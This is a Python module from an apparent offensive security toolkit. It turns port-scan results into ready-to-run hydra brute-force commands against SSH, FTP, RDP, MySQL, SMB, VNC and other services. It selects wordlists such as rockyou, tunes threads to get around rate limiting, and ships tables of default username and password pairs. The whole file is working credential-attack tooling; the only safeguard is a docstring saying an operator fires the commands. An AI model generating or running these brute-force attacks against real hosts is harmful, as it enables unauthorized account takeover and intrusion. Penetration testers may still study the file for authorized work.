"""cred_engine.py — smart password/credential attack engine.

Given discovered services and optional credential intel, generates
the RIGHT hydra/medusa command with:
  - service-specific wordlist selection (SSH vs FTP vs RDP vs MySQL)
  - smart user list (single user vs list vs default creds)
  - thread/timing tuned per service (RDP is slow, SSH rate-limits)
  - output logging per target

Safety: generates commands only; operator fires them from terminal.
"""
from __future__ import annotations

import logging
import os
import re
from typing import Any, Dict, List, Optional

logger = logging.getLogger("AttackSurface.CredEngine")

# wordlist candidates per service (first existing wins)
WORDLISTS = {
    "users": [
        "/usr/share/metasploit-framework/data/wordlists/unix_users.txt",
        "/usr/share/wordlists/metasploit/unix_users.txt",
        "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
    ],
    "passes": [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/metasploit/unix_passwords.txt",
        "/usr/share/wordlists/john.lst",
    ],
    "default_creds": {
        "ftp": [("anonymous", ""), ("ftp", "ftp"), ("admin", "admin"),
                ("root", "root"), ("user", "user")],
        "ssh": [("root", "root"), ("admin", "admin"), ("user", "user"),
                ("test", "test"), ("oracle", "oracle")],
        "mysql": [("root", ""), ("root", "root"), ("admin", "admin")],
        "rdp": [("administrator", "administrator"), ("admin", "admin")],
        "telnet": [("root", "root"), ("admin", "admin")],
        "smtp": [("postmaster", ""), ("admin", "admin")],
    },
}

# service → hydra module + timing
SERVICE_MAP = {
    "ssh":     {"hydra": "ssh",     "threads": 4,  "timeout": 15,
                "notes": "SSH rate-limits; keep threads low"},
    "ftp":     {"hydra": "ftp",     "threads": 8,  "timeout": 10,
                "notes": "FTP usually accepts more parallelism"},
    "telnet":  {"hydra": "telnet",  "threads": 4,  "timeout": 15,
                "notes": "Telnet is fragile; low threads"},
    "rdp":     {"hydra": "rdp",     "threads": 2,  "timeout": 30,
                "notes": "RDP is slow; 2 threads max"},
    "mysql":   {"hydra": "mysql",   "threads": 4,  "timeout": 15,
                "notes": "MySQL brute-force is noisy"},
    "mssql":   {"hydra": "mssql",   "threads": 4,  "timeout": 15,
                "notes": "MSSQL brute-force"},
    "postgres":{"hydra": "postgres","threads": 4,  "timeout": 15,
                "notes": "PostgreSQL brute-force"},
    "smb":     {"hydra": "smb",     "threads": 4,  "timeout": 20,
                "notes": "SMB brute-force (CME better for this)"},
    "smtp":    {"hydra": "smtp",    "threads": 4,  "timeout": 15,
                "notes": "SMTP VRFY/EXPN may leak users first"},
    "pop3":    {"hydra": "pop3",    "threads": 6,  "timeout": 12,
                "notes": "POP3 brute-force"},
    "imap":    {"hydra": "imap",    "threads": 6,  "timeout": 12,
                "notes": "IMAP brute-force"},
    "vnc":     {"hydra": "vnc",     "threads": 2,  "timeout": 30,
                "notes": "VNC passwords are short; fast"},
    "http-get":{"hydra": "http-get","threads": 6,  "timeout": 12,
                "notes": "HTTP form brute-force"},
}


def _first_existing(candidates: List[str]) -> str:
    for p in candidates:
        if os.path.isfile(p):
            return p
    return candidates[0]  # return default even if missing (operator may have it)


def detect_service(host: str, ports: List[Dict[str, Any]]) -> List[str]:
    """Return service names found on a host's open ports."""
    svcs = set()
    for p in ports or []:
        if not isinstance(p, dict):
            continue
        svc = (p.get("service") or "").lower()
        ver = (p.get("service_versioned") or "").lower()
        blob = f"{svc} {ver}"
        for name in SERVICE_MAP:
            if name in blob:
                svcs.add(name)
        # common aliases
        if "ms-wbt" in blob or "msrdp" in blob:
            svcs.add("rdp")
        if "microsoft-ds" in blob or "netbios-ssn" in blob:
            svcs.add("smb")
        if "ms-sql" in blob or "mssql" in blob:
            svcs.add("mssql")
    return sorted(svcs)


def generate_commands(host: str, services: List[str],
                      mode: str = "default") -> List[Dict[str, Any]]:
    """Generate hydra commands for each service on a host.

    mode:
      default     → wordlist brute-force (rockyou)
      quick       → small list (john.lst) for fast test
      default_creds → try known default credentials only
    """
    results = []
    users = _first_existing(WORDLISTS["users"])
    passes = _first_existing(WORDLISTS["passes"])
    quick_pass = "/usr/share/wordlists/john.lst"

    for svc in services:
        info = SERVICE_MAP.get(svc)
        if not info:
            continue
        hydra_mod = info["hydra"]
        threads = info["threads"]
        timeout = info["timeout"]

        if mode == "default_creds":
            defaults = WORDLISTS["default_creds"].get(svc, [])
            if not defaults:
                continue
            for user, pwd in defaults:
                cmd = (f"hydra -l {user} -p '{pwd}' -t {threads} "
                       f"-o /tmp/hydra_{svc}_{host}.txt "
                       f"{host} {hydra_mod}")
                results.append({
                    "host": host, "service": svc, "mode": "default_creds",
                    "cmd": cmd, "user": user, "password": pwd,
                    "threads": threads, "timeout": timeout,
                    "notes": f"Default credential test: {user}:{pwd or '(empty)'}",
                    "safe": False,
                })
        elif mode == "quick":
            cmd = (f"hydra -L {users} -P {quick_pass} -t {threads} "
                   f"-f -o /tmp/hydra_{svc}_{host}.txt "
                   f"{host} {hydra_mod}")
            results.append({
                "host": host, "service": svc, "mode": "quick",
                "cmd": cmd, "threads": threads, "timeout": timeout,
                "notes": f"Quick test with john.lst ({info['notes']})",
                "safe": False,
            })
        else:  # default — full rockyou
            cmd = (f"hydra -L {users} -P {passes} -t {threads} "
                   f"-o /tmp/hydra_{svc}_{host}.txt "
                   f"{host} {hydra_mod}")
            results.append({
                "host": host, "service": svc, "mode": "default",
                "cmd": cmd, "threads": threads, "timeout": timeout,
                "notes": f"Full brute-force with rockyou ({info['notes']})",
                "safe": False,
            })
    return results


def analyze_scan_for_creds(scan_data: Dict[str, Any]) -> List[Dict[str, Any]]:
    """Full pipeline: scan data → credential attack suggestions."""
    all_suggestions = []
    hosts = scan_data.get("hosts") or []
    domain = scan_data.get("domain") or ""

    for h in hosts:
        host = h.get("host") or domain
        if not host:
            continue
        ports_raw = h.get("ports") or "[]"
        if isinstance(ports_raw, str):
            try:
                ports = json.loads(ports_raw)
            except Exception:
                ports = []
        else:
            ports = ports_raw
        services = detect_service(host, ports)
        if services:
            suggestions = generate_commands(host, services, mode="default")
            all_suggestions.extend(suggestions)
    return all_suggestions


import json  # noqa: E402  (used in analyze_scan_for_creds)
